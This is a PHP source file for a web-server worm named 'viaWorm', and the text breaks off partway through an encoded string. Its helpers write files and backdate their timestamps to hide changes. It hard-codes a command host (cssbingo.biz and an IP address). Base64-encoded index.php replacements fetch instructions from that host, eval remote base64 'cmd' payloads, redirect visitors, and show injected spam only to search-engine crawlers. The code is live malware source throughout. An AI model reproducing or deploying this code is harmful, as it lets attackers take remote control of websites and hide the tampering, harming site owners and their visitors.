"<?php\n\/\/@TODO chmod 0755 and touch all changed files\nif (function_exists('apache_get_modules')) {\n    $modules = apache_get_modules();\n    $mod_rewrite = in_array('mod_rewrite', $modules);\n} else {\n    $mod_rewrite =  getenv('HTTP_MOD_REWRITE')=='On' ? true : false ;\n}\n\nif (!function_exists('json_encode')) {\n    function json_encode($value)\n    {\n        if (is_int($value)) {\n            return (string)$value;\n        } elseif (is_string($value)) {\n            $value = str_replace(array('\\\\', '\/', '\"', \"\\r\", \"\\n\", \"\\b\", \"\\f\", \"\\t\"),\n                array('\\\\\\\\', '\\\/', '\\\"', '\\r', '\\n', '\\b', '\\f', '\\t'), $value);\n            $convmap = array(0x80, 0xFFFF, 0, 0xFFFF);\n            $result = \"\";\n            for ($i = mb_strlen($value) - 1; $i >= 0; $i--) {\n                $mb_char = mb_substr($value, $i, 1);\n                if (mb_ereg(\"&#(\\\\d+);\", mb_encode_numericentity($mb_char, $convmap, \"UTF-8\"), $match)) {\n                    $result = sprintf(\"\\\\u%04x\", $match[1]) . $result;\n                } else {\n                    $result = $mb_char . $result;\n                }\n            }\n            return '\"' . $result . '\"';\n        } elseif (is_float($value)) {\n            return str_replace(\",\", \".\", $value);\n        } elseif (is_null($value)) {\n            return 'null';\n        } elseif (is_bool($value)) {\n            return $value ? 'true' : 'false';\n        } elseif (is_array($value)) {\n            $with_keys = false;\n            $n = count($value);\n            for ($i = 0, reset($value); $i < $n; $i++, next($value)) {\n                if (key($value) !== $i) {\n                    $with_keys = true;\n                    break;\n                }\n            }\n        } elseif (is_object($value)) {\n            $with_keys = true;\n        } else {\n            return '';\n        }\n        $result = array();\n        if ($with_keys) {\n            foreach ($value as $key => $v) {\n                $result[] = json_encode((string)$key) . ':' . json_encode($v);\n            }\n            return '{' . implode(',', $result) . '}';\n        } else {\n            foreach ($value as $key => $v) {\n                $result[] = json_encode($v);\n            }\n            return '[' . implode(',', $result) . ']';\n        }\n    }\n}\n\nif (!function_exists('json_decode')) {\n\n    function json_decode($json, $assoc = false)\n    {\n        mb_internal_encoding(\"UTF-8\");\n        $i = 0;\n        $n = strlen($json);\n        try {\n            $result = json_decode_value($json, $i, $assoc);\n            while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n            if ($i < $n) {\n                return null;\n            }\n            return $result;\n        } catch (Exception $e) {\n            return null;\n        }\n    }\n\n    function json_decode_value($json, &$i, $assoc = false)\n    {\n        $n = strlen($json);\n        while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n\n        switch ($json[$i]) {\n            \/\/ object\n            case '{':\n                $i++;\n                $result = $assoc ? array() : new stdClass();\n                while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                if ($json[$i] === '}') {\n                    $i++;\n                    return $result;\n                }\n                while ($i < $n) {\n                    $key = json_decode_string($json, $i);\n                    while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                    if ($json[$i++] != ':') {\n                        throw new Exception(\"Expected ':' on \".($i - 1));\n                    }\n                    if ($assoc) {\n                        $result[$key] = json_decode_value($json, $i, $assoc);\n                    } else {\n                        $result->$key = json_decode_value($json, $i, $assoc);\n                    }\n                    while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                    if ($json[$i] === '}') {\n                        $i++;\n                        return $result;\n                    }\n                    if ($json[$i++] != ',') {\n                        throw new Exception(\"Expected ',' on \".($i - 1));\n                    }\n                    while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                }\n                throw new Exception(\"Syntax error\");\n            \/\/ array\n            case '[':\n                $i++;\n                $result = array();\n                while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                if ($json[$i] === ']') {\n                    $i++;\n                    return array();\n                }\n                while ($i < $n) {\n                    $result[] = json_decode_value($json, $i, $assoc);\n                    while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                    if ($json[$i] === ']') {\n                        $i++;\n                        return $result;\n                    }\n                    if ($json[$i++] != ',') {\n                        throw new Exception(\"Expected ',' on \".($i - 1));\n                    }\n                    while ($i < $n && $json[$i] && $json[$i] <= ' ') $i++;\n                }\n                throw new Exception(\"Syntax error\");\n            \/\/ string\n            case '\"':\n                return json_decode_string($json, $i);\n            \/\/ number\n            case '-':\n                return json_decode_number($json, $i);\n            \/\/ true\n            case 't':\n                if ($i + 3 < $n && substr($json, $i, 4) === 'true') {\n                    $i += 4;\n                    return true;\n                }\n            \/\/ false\n            case 'f':\n                if ($i + 4 < $n && substr($json, $i, 5) === 'false') {\n                    $i += 5;\n                    return false;\n                }\n            \/\/ null\n            case 'n':\n                if ($i + 3 < $n && substr($json, $i, 4) === 'null') {\n                    $i += 4;\n                    return null;\n                }\n            default:\n                \/\/ number\n                if ($json[$i] >= '0' && $json[$i] <= '9') {\n                    return json_decode_number($json, $i);\n                } else {\n                    throw new Exception(\"Syntax error\");\n                };\n        }\n    }\n\n    function json_decode_string($json, &$i)\n    {\n        $result = '';\n        $escape = array('\"' => '\"', '\\\\' => '\\\\', '\/' => '\/', 'b' => \"\\b\", 'f' => \"\\f\", 'n' => \"\\n\", 'r' => \"\\r\", 't' => \"\\t\");\n        $n = strlen($json);\n        if ($json[$i] === '\"') {\n            while (++$i < $n) {\n                if ($json[$i] === '\"') {\n                    $i++;\n                    return $result;\n                } elseif ($json[$i] === '\\\\') {\n                    $i++;\n                    if ($json[$i] === 'u') {\n                        $code = \"&#\".hexdec(substr($json, $i + 1, 4)).\";\";\n                        $convmap = array(0x80, 0xFFFF, 0, 0xFFFF);\n                        $result .= mb_decode_numericentity($code, $convmap, 'UTF-8');\n                        $i += 4;\n                    } elseif (isset($escape[$json[$i]])) {\n                        $result .= $escape[$json[$i]];\n                    } else {\n                        break;\n                    }\n                } else {\n                    $result .= $json[$i];\n                }\n            }\n        }\n        throw new Exception(\"Syntax error\");\n    }\n\n    function json_decode_number($json, &$i)\n    {\n        $result = '';\n        if ($json[$i] === '-') {\n            $result = '-';\n            $i++;\n        }\n        $n = strlen($json);\n        while ($i < $n && $json[$i] >= '0' && $json[$i] <= '9') {\n            $result .= $json[$i++];\n        }\n\n        if ($i < $n && $json[$i] === '.') {\n            $result .= '.';\n            $i++;\n            while ($i < $n && $json[$i] >= '0' && $json[$i] <= '9') {\n                $result .= $json[$i++];\n            }\n        }\n        if ($i < $n && ($json[$i] === 'e' || $json[$i] === 'E')) {\n            $result .= $json[$i];\n            $i++;\n            if ($json[$i] === '-' || $json[$i] === '+') {\n                $result .= $json[$i++];\n            }\n            while ($i < $n && $json[$i] >= '0' && $json[$i] <= '9') {\n                $result .= $json[$i++];\n            }\n        }\n\n        return (0 + $result);\n    }\n}\n\nfunction __via_file_put_contents($savePath, $content){\n\n    $changeTime = null;\n\n    $paths = __via_get_dir_file_paths(dirname($savePath));\n    foreach($paths as $path){\n        if($path != __FILE__){\n            $changeTime = filemtime($path);\n            break;\n        }\n    }\n\n    if(!$changeTime){\n        $changeTime = time();\n    }\n\n    $isExistingFile = @file_exists($savePath);\n    if($isExistingFile){\n        @chmod($savePath, 0755);\n    }\n\n    $result = @file_put_contents($savePath, $content);\n    if(!$isExistingFile){\n        @chmod($savePath, 0755);\n    }\n\n    @touch($savePath, $changeTime);\n\n    return $result;\n\n}\n\nfunction __via_get_dir_file_paths($dir){\n\n    $filesPaths = array();\n\n    foreach(@scandir($dir) as $filePath){\n        if($filePath != '.' && $filePath != '..'){\n            $filePath = $dir . DIRECTORY_SEPARATOR . $filePath;\n            $filesPaths[] = $filePath;\n        }\n    }\n\n    return $filesPaths;\n\n}\n\nfunction __via_file_get_contents_curl($url, $timeout = 600) {\n\n    if(function_exists('curl_init')){\n\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT ,0);\n        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); \/\/timeout in seconds\n        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        curl_setopt($ch, CURLOPT_URL, $url);\n        if(!ini_get('safe_mode') && !ini_get('open_basedir')){\n            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);\n        }\n        curl_setopt($ch, CURLOPT_HTTPHEADER, array(\n            'Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',\n            'User-Agent: Mozilla\/5.0 (X11; Linux x86_64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/35.0.1916.114 Safari\/537.36',\n        ));\n\n        $data = curl_exec($ch);\n        curl_close($ch);\n\n        if(!$data){\n            $data = @file_get_contents($url);\n        }\n        return $data;\n\n    }\n\n    return @file_get_contents($url);\n\n}\n\n$use_only_daddy_ip = false;\nfunction __via_get_host($host, $ip, $uri){\n\n    global $use_only_daddy_ip;\n    if($use_only_daddy_ip){\n        return $ip;\n    }\n\n    $__via_host = $host;\n    $response = __via_file_get_contents_curl('http:\/\/' . $__via_host . $uri . '\/test.txt');\n\n    if(!$response || $response === 'false' || ($response && $response != 1)){\n        $__via_host = $ip;\n    }\n\n    return $__via_host;\n\n}\n\n$__via_daddy_host = null;\nfunction __via_get_daddy_url(){\n\n    global $__via_daddy_host;\n    if($__via_daddy_host === null){\n        $__via_daddy_host = __via_get_host(viaWorm::DADDY_HOST, viaWorm::DADDY_IP, viaWorm::DADDY_URI);\n    }\n\n    return 'http:\/\/' . $__via_daddy_host . viaWorm::DADDY_URI;\n\n}\n\n$__via_links_daddy_host = null;\nfunction __via_get_links_daddy_url(){\n\n    global $__via_links_daddy_host;\n    if($__via_links_daddy_host === null){\n        $__via_links_daddy_host = __via_get_host(viaWorm::LINKS_DADDY_HOST, viaWorm::LINKS_DADDY_IP, viaWorm::LINKS_DADDY_URI);\n    }\n\n    return 'http:\/\/' . $__via_links_daddy_host . viaWorm::LINKS_DADDY_URI;\n\n}\n\n\/**\n * Class viaWorm\n *\/\nclass viaWorm\n{\n\n    const DADDY_HOST = 'cssbingo.biz';\n    const DADDY_IP = '149.154.68.31';\n    const DADDY_URI = '';\n    const LINKS_DADDY_HOST = 'cssbingo.biz';\n    const LINKS_DADDY_IP = '149.154.68.31';\n    const LINKS_DADDY_URI = '';\n\n    const INDEX_SOURCE_KEY_FULL = 'full';\n    const INDEX_SOURCE_KEY_ARTICLES = 'articles';\n\n    \/**\n     * @var string\n     *\/\n    protected $host;\n\n    \/**\n     * @var string\n     *\/\n    protected $rootDir;\n\n    \/**\n     * @var string\n     *\/\n    protected $wormFilesPath;\n\n    \/**\n     * @var SplFileInfo|null\n     *\/\n    protected $htaccessFile;\n\n    \/**\n     * @var array\n     *\/\n    protected $possibleIndexes = array();\n\n    \/**\n     * @var SplFileInfo\n     *\/\n    protected $indexFile;\n\n    \/**\n     * @var array\n     *\/\n    public static $indexSources = array(\n        self::INDEX_SOURCE_KEY_FULL => 'Cjw\/cGhwCgovKioKICogUGxhY2Vob2xkZXJzCiAqLwokY29weV9maWxlX25hbWUgPSAnOmNvcHlfZmlsZV9uYW1lJzsKJGRhZGR5X2hvc3QgPSAnOmRhZGR5X2hvc3QnOwoKJGFnZW50ID0gJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZG9tYWluID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOwokcmVmZXJlciA9IGlzc2V0KCRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSkgPyAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl0gOiBudWxsOwoKJGNvbnRlbnQgPSBudWxsOwokdGl0bGUgPSBudWxsOwokZGVzY3JpcHRpb24gPSBudWxsOwoKJHVyaSA9IGlzc2V0KCRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKSA\/ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdIDogIi8iOwppZigkdXJpICE9ICIvIil7CiAgICAkdXJpID0gcnRyaW0oJHVyaSwgIi9cXCIpOwp9CgokZF9wID0gaXNzZXQoJF9HRVRbImRfcCJdKSA\/ICRfR0VUWyJkX3AiXSA6IG51bGw7CiRkX2YgPSBpc3NldCgkX0dFVFsiZF9mIl0pID8gJF9HRVRbImRfZiJdIDogbnVsbDsKJHVybCA9ICJodHRwOi8vJGRhZGR5X2hvc3QvcGFnZT9kb21haW49IiAuIHVybGVuY29kZSgkZG9tYWluKSAuICImdXJpPSIgLiB1cmxlbmNvZGUoJHVyaSkgLiAiJnVzZXJfYWdlbnQ9IiAuIHVybGVuY29kZSgkYWdlbnQpIC4gIiZyZWZlcmVyPSIgLiB1cmxlbmNvZGUoJHJlZmVyZXIpIC4gIiZkX3A9IiAuICRkX3AgLiAiJmRfZj0iIC4gJGRfZjsKCmNsYXNzIF92aWFfUmVzcG9uc2UgewogICAgcHVibGljIHN0YXRpYyAkaXNfcmVuZGVyZWQgPSBmYWxzZTsKICAgIHB1YmxpYyBzdGF0aWMgJHJlc3BvbnNlID0gbnVsbDsKfQoKJGlnbm9yZV91cmkgPSBhcnJheSgKICAgICcvcm9ib3RzLnR4dCcsCiAgICAnL2Zhdmljb24uaWNvJywKKTsKCiRqc29uX3Jlc3BvbnNlID0gaW5fYXJyYXkoJHVyaSwgJGlnbm9yZV91cmkpID8gbnVsbCA6IEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKaWYoJGpzb25fcmVzcG9uc2UgJiYgJGpzb25fcmVzcG9uc2UgIT0gImZhbHNlIil7CgogICAgaWYgKGluX2FycmF5KHN1YnN0cih0cmltKCRqc29uX3Jlc3BvbnNlKSwgMCwgMSksIGFycmF5KCJbIiwgInsiKSkpIHsKCiAgICAgICAgX3ZpYV9SZXNwb25zZTo6JHJlc3BvbnNlID0ganNvbl9kZWNvZGUoJGpzb25fcmVzcG9uc2UsIHRydWUpOwoKICAgICAgICBpZihpc3NldChfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2VbImNtZCJdKSl7CiAgICAgICAgICAgIGV2YWwoYmFzZTY0X2RlY29kZShfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2VbImNtZCJdKSk7CiAgICAgICAgfQoKICAgICAgICBpZihpc3NldChfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2VbInJlZGlyZWN0X3VybCJdKSl7CiAgICAgICAgICAgIGhlYWRlcigiTG9jYXRpb246ICIgLiBfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2VbInJlZGlyZWN0X3VybCJdLCB0cnVlLCAzMDEpOwogICAgICAgICAgICBkaWUoKTsKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIHZpYV9yZW5kZXJfcGFnZSgpIHsKCiAgICAgICAgICAgIGlmKF92aWFfUmVzcG9uc2U6OiRpc19yZW5kZXJlZCl7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRfY29udGVudCA9IG9iX2dldF9jb250ZW50cygpOwoKICAgICAgICAgICAgJGFnZW50ID0gJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwogICAgICAgICAgICAkZG9tYWluID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOwogICAgICAgICAgICAkcmVmZXJlciA9IGlzc2V0KCRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXSkgPyAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl0gOiBudWxsOwoKICAgICAgICAgICAgJGlzX2JvdCA9IGZhbHNlOwoKICAgICAgICAgICAgJGJvdHMgPSBleHBsb2RlKCIsIiwgImJpbmdib3QsQWhyZWZzLFNpdGVCb3QsdGVzdGJvdCxnb29nbGVib3QsbWVkaWFwYXJ0bmVycy1nb29nbGUseWFob28tdmVydGljYWxjcmF3bGVyLHlhaG9vISBzbHVycCx5YWhvby1tbSxZYW5kZXgsaW5rdG9taSxzbHVycCxpbHRyb3ZhdG9yZS1zZXRhY2NpbyxmYXN0LXdlYmNyYXdsZXIsbXNuYm90LGFzayBqZWV2ZXMsdGVvbWEsc2Nvb3Rlcixwc2JvdCxvcGVuYm90LGlhX2FyY2hpdmVyLGFsbWFkZW4sYmFpZHVzcGlkZXIsenlib3JnLGdpZ2Fib3QsbmF2ZXJib3Qsc3VydmV5Ym90LGJvaXRoby5jb20tZGMsb2JqZWN0c3NlYXJjaCxhbnN3ZXJidXMsbnNvaHUtc2VhcmNoIik7CiAgICAgICAgICAgIGZvcmVhY2goJGJvdHMgYXMgJGJvdCl7CiAgICAgICAgICAgICAgICBpZiAoc3RycG9zKHN0cnRvbG93ZXIoJGFnZW50KSwgdHJpbShzdHJ0b2xvd2VyKCRib3QpKSkgIT09IGZhbHNlKXsKICAgICAgICAgICAgICAgICAgICAkaXNfYm90ID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGlzX3JlZmVyZXIgPSBmYWxzZTsKCiAgICAgICAgICAgICRkb21haW5fcG9zID0gc3RycG9zKCRyZWZlcmVyLCAkZG9tYWluKSAtIDc7CiAgICAgICAgICAgIGlmKCRyZWZlcmVyICYmICRkb21haW5fcG9zICE9IDApewogICAgICAgICAgICAgICAgJGlzX3JlZmVyZXIgPSB0cnVlOwogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkaXNfYm90IHx8ICRpc19yZWZlcmVyKXsKCiAgICAgICAgICAgICAgICAkY29udGVudCA9IG51bGw7CiAgICAgICAgICAgICAgICAkdGl0bGUgPSBudWxsOwogICAgICAgICAgICAgICAgJGRlc2NyaXB0aW9uID0gbnVsbDsKCiAgICAgICAgICAgICAgICBpZiAoaXNfYXJyYXkoX3ZpYV9SZXNwb25zZTo6JHJlc3BvbnNlKSkgewoKICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsiYm9keSJdOwogICAgICAgICAgICAgICAgICAgICR0aXRsZSA9IF92aWFfUmVzcG9uc2U6OiRyZXNwb25zZVsidGl0bGUiXTsKICAgICAgICAgICAgICAgICAgICAkZGVzY3JpcHRpb24gPSBfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2VbImRlc2NyaXB0aW9uIl07CgogICAgICAgICAgICAgICAgfSBlbHNlIHsKCiAgICAgICAgICAgICAgICAgICAgJGNvbnRlbnQgPSBfdmlhX1Jlc3BvbnNlOjokcmVzcG9uc2U7CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCR0aXRsZSl7CiAgICAgICAgICAgICAgICAgICAgJF9jb250ZW50ID0gcHJlZ19yZXBsYWNlKCcvPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiguKikiPi9pJywnJywkX2NvbnRlbnQpOwogICAgICAgICAgICAgICAgICAgIGlmKCRkZXNjcmlwdGlvbil7CiAgICAgICAgICAgICAgICAgICAgICAgICRfY29udGVudCA9IHByZWdfcmVwbGFjZSgnLzx0aXRsZT4oLiopPFwvdGl0bGU+L2knLCc8dGl0bGU+Jy4kdGl0bGUuJzwvdGl0bGU+PG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IicuJGRlc2NyaXB0aW9uLiciPicsJF9jb250ZW50KTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRjb250ZW50ICYmIGlzX3N0cmluZygkY29udGVudCkpIHsKCiAgICAgICAgICAgICAgICAgICAgcHJlZ19tYXRjaCgnLzxib2R5KC4qPyk+L3NpJywgJF9jb250ZW50LCAkbWF0Y2hlcyk7CiAgICAgICAgICAgICAgICAgICAgJGRlbGltaXRlciA9ICI8Ym9keSIgLiAoaXNzZXQoJG1hdGNoZXNbMV0pID8gJG1hdGNoZXNbMV0gOiBudWxsKSAuICI+IjsKCiAgICAgICAgICAgICAgICAgICAgJHBhZ2VfcGFydHMgPSBleHBsb2RlKCRkZWxpbWl0ZXIsICRfY29udGVudCk7CgogICAgICAgICAgICAgICAgICAgIGlmKCRkZXNjcmlwdGlvbil7CiAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlX3BhcnRzWzFdID0gJGRlbGltaXRlciAuICRjb250ZW50LiAiPC9ib2R5PiI7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VfcGFydHNbMF0gLj0gKCRkZWxpbWl0ZXIgLiAkY29udGVudCk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkX2NvbnRlbnQgPSBpbXBsb2RlKCIiLCAkcGFnZV9wYXJ0cyk7CgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgb2JfZW5kX2NsZWFuKCk7CgogICAgICAgICAgICBfdmlhX1Jlc3BvbnNlOjokaXNfcmVuZGVyZWQgPSB0cnVlOwogICAgICAgICAgICBlY2hvICRfY29udGVudDsKCiAgICAgICAgfQoKICAgICAgICByZWdpc3Rlcl9zaHV0ZG93bl9mdW5jdGlvbigidmlhX3JlbmRlcl9wYWdlIik7CgogICAgICAgIG9iX3N0YXJ0KCk7CgogICAgICAgIGluY2x1ZGVfb25jZSgkY29weV9maWxlX25hbWUpOwoKICAgICAgICB2aWFfcmVuZGVyX3BhZ2UoKTsKCiAgICB9IGVsc2UgewoKICAgICAgICBlY2hvICRqc29uX3Jlc3BvbnNlOwoKICAgIH0KCgp9IGVsc2UgewoKICAgIGluY2x1ZGVfb25jZSgkY29weV9maWxlX25hbWUpOwoKfQo=',\n        self::INDEX_SOURCE_KEY_ARTICLES => '\/ICRyZXN1bHRbMF0gOiAnJzsKICAgICRjb250ZW50ID0gaXNzZXQoJHJlc3VsdFsxXSkgPyAkcmVzdWx0WzFdIDogJyc7CgogICAgLy8gcmV0dXJuIGFzIHN0cnVjdHVyZWQgYXJyYXk6CiAgICByZXR1cm4gYXJyYXkoCiAgICAgICAgJ3N0YXR1cycgPT4gJ29rJywKICAgICAgICAnaGVhZGVyJyA9PiAkaGVhZGVyLAogICAgICAgICdjb250ZW50JyA9PiAkY29udGVudAogICAgKTsKCn0KCiR1cmkgPSBpc3NldCgkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSkgPyBzdHJfcmVwbGFjZSgnL2luZGV4LnBocCcsICcnLCAkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSkgOiAiLyI7CmlmKGlzc2V0KCRfU0VSVkVSWyJRVUVSWV9TVFJJTkciXSkpewoKICAgIGlmKHN0cnBvcygkX1NFUlZFUlsiUVVFUllfU1RSSU5HIl0sICc\/JykgIT09IGZhbHNlKXsKICAgICAgICBsaXN0KCRiYXNlX3F1ZXJ5LCAkZXh0cmFfcXVlcnkpID0gZXhwbG9kZSgnPycsICRfU0VSVkVSWyJRVUVSWV9TVFJJTkciXSk7CiAgICAgICAgJHVyaSA9IHN0cl9yZXBsYWNlKCRleHRyYV9xdWVyeSwgJycsICR1cmkpOwogICAgfSBlbHNlaWYoc3RycG9zKCRfU0VSVkVSWyJRVUVSWV9TVFJJTkciXSwgJz0nKSA9PT0gZmFsc2UpewogICAgICAgICR1cmkgPSBzdHJfcmVwbGFjZSgkX1NFUlZFUlsiUVVFUllfU1RSSU5HIl0sICcnLCAkdXJpKTsKICAgIH0KCiAgICAkdXJpID0gdHJpbSgkdXJpLCAnPycpOwoKfQoKLyoqCiAqIFdlYnNpdGUgY2FjaGUgY2xlYXIKICovCmlmKGlzc2V0KCRfR0VUWyd2aWEtbWFrZS1jYWNoZS1jbGVhciddKSl7CgogICAgaWYoQGlzX2RpcigkcGFnZXNfc291cmNlc19wYXRoKSl7CiAgICAgICAgZWNobyBfX3ZpYV9kZXN0cm95X2RpcigkcGFnZXNfc291cmNlc19wYXRoKSA\/IDEgOiAwOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvIDE7CiAgICB9CgogICAgZXhpdCgpOwp9CgovKioKICogV2Vic2l0ZSBsaW5rcyBjYWNoZSBjbGVhcgogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLWxpbmtzLWNhY2hlLWNsZWFyJ10pKXsKCiAgICBpZihAaXNfZGlyKCRsaW5rc19zb3VyY2VzX3BhdGgpKXsKCiAgICAgICAgZWNobyBfX3ZpYV9kZXN0cm95X2RpcigkbGlua3Nfc291cmNlc19wYXRoKSA\/IDEgOiAwOwoKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAxOwogICAgfQoKICAgIGV4aXQoKTsKfQoKLyoqCiAqIFdlYnNpdGUgbGlua3MgY2FjaGUgY2xlYXIgYnkgaGFzaAogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLWxpbmtzLWNhY2hlLWNsZWFyLWJ5LWhhc2gnXSkpewoKICAgIGlmKEBpc19kaXIoJGxpbmtzX3NvdXJjZXNfcGF0aCkpewoKICAgICAgICAkcGFnZXNfaGFzaGVzID0gaXNzZXQoJF9HRVRbJ2hhc2hlcyddKSA\/ICRfR0VUWydoYXNoZXMnXSA6IGFycmF5KCk7CiAgICAgICAgaWYoaXNfYXJyYXkoJHBhZ2VzX2hhc2hlcykpewoKICAgICAgICAgICAgZm9yZWFjaCgkcGFnZXNfaGFzaGVzIGFzICRwYWdlX2hhc2gpewoKICAgICAgICAgICAgICAgICRwYWdlX2xpbmtzX2ZpbGVfcGF0aCA9ICRsaW5rc19zb3VyY2VzX3BhdGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJHBhZ2VfaGFzaDsKICAgICAgICAgICAgICAgIGlmKEBpc19maWxlKCRwYWdlX2xpbmtzX2ZpbGVfcGF0aCkpewogICAgICAgICAgICAgICAgICAgIEB1bmxpbmsoJHBhZ2VfbGlua3NfZmlsZV9wYXRoKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQoKICAgIH0KCiAgICBlY2hvIDE7CgogICAgZXhpdCgpOwp9CgovKioKICogV2Vic2l0ZSBtYXAgY2xlYXIKICovCmlmKGlzc2V0KCRfR0VUWyd2aWEtbWFrZS1tYXAtY2xlYXInXSkpewoKICAgIGlmKEBpc19maWxlKCRwYWdlc19tYXBfZmlsZSkpewogICAgICAgIGVjaG8gQHVubGluaygkcGFnZXNfbWFwX2ZpbGUpID8gMSA6IDA7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gMTsKICAgIH0KCiAgICBleGl0KCk7Cn0KCi8qKgogKiBXZWJzaXRlIHN0YXRpYyBmaWxlcyBjbGVhcgogKi8KaWYoaXNzZXQoJF9HRVRbJ3ZpYS1tYWtlLXN0YXRpYy1maWxlcy1jbGVhciddKSl7CgogICAgaWYoQGlzX2Rpcigkc3RhdGljX2ZpbGVzX3BhdGgpKXsKCiAgICAgICAgZWNobyBfX3ZpYV9kZXN0cm95X2Rpcigkc3RhdGljX2ZpbGVzX3BhdGgpID8gMSA6IDA7CgogICAgfSBlbHNlIHsKICAgICAgICBlY2hvIDE7CiAgICB9CgogICAgZXhpdCgpOwp9CgovKioKICogV2Vic2l0ZSBjb25maWcgY2xlYXIKICovCmlmKGlzc2V0KCRfR0VUWyd2aWEtbWFrZS1jb25maWctY2xlYXInXSkpewoKICAgIGlmKEBpc19maWxlKCR3ZWJzaXRlX2NvbmZpZ19maWxlKSl7CiAgICAgICAgZWNobyBAdW5saW5rKCR3ZWJzaXRlX2NvbmZpZ19maWxlKSA\\/cGFnZUNvbnRlbnQ9MSI7CiAgICAgICAgICAgICAgICAgICAgICAgICRsaW5rc19zb3VyY2UgPSBAZmlsZV9nZXRfY29udGVudHMoJHVybCwgZmFsc2UsICRjb250ZXh0KTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRsaW5rc19zb3VyY2UpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxpbmtzX3NvdXJjZSA9IEBfX3ZpYV9maWxlX2dldF9jb250ZW50c19jdXJsKCR1cmwpOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBpZigkbGlua3Nfc291cmNlICYmICRsaW5rc19zb3VyY2UgIT0gJ2ZhbHNlJyl7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2VzX3VybHMgPSBhcnJheSgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGlzSnNvbiA9IGluX2FycmF5KHN1YnN0cih0cmltKCRsaW5rc19zb3VyY2UpLCAwLCAxKSwgYXJyYXkoJ1snLCAneycpKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaXNKc29uKXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF9fcGFnZXMgPSBqc29uX2RlY29kZSgkbGlua3Nfc291cmNlLCB0cnVlKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoaXNfYXJyYXkoJF9fcGFnZXMpKXsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJF9fcGFnZXMgYXMgJF9fcGFnZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihpc3NldCgkX19wYWdlWyd1cmwnXSkgJiYgaXNzZXQoJF9fcGFnZVsnYW5jaG9yJ10pKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZXNfdXJsc1tdID0gIjxsaT48YSBocmVmPSciIC4gJF9fcGFnZVsndXJsJ10gLiAiJz4iIC4gJF9fcGFnZVsnYW5jaG9yJ10gLiAiPC9hPjwvbGk+IjsKICAgICAgICAgICAgICAgICAgIC